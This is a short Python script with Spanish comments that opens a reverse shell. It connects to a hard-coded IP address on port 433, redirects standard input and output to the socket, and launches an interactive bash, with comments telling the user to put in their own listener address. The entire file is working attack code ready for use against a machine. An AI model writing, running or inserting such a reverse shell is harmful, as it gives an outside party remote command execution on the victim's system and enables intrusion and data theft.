import socket
import subprocess
import os

# Configuración de la conexión
ip = "186.52.254.62"  # Cambia por tu IP
port = 433  # Cambia por el puerto que escucharás

# Crear el socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Redirigir entradas y salidas
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Abrir shell
subprocess.call(["/bin/bash", "-i"])
